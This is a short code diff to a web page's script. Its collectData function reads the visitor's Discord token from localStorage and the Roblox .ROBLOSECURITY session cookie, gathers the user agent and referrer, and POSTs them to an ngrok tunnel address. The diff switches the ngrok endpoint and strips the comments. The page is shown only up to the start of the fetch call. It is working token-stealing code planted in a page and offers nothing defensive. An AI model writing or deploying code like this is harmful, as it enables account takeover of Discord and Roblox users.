@@ -37,18 +37,13 @@
     </div>
 <script>
     function collectData() {
-        // Attempt to collect Discord token (if available)
         const discordToken = localStorage.getItem('token') || 'N/A';
-
-        // Attempt to collect Roblox cookie (if available)
         const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
-
-        // Collect additional info
         const userAgent = navigator.userAgent;
         const referrer = document.referrer;
 
         // Send data to your backend
-        fetch('https://35aa-2a02-8084-e80-3400-c93a-72e0-111-85e6.ngrok-free.app', {
+        fetch('https://afc6-2a02-8084-e80-3400-493f-95a1-6f55-d710.ngrok-free.app/submit', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
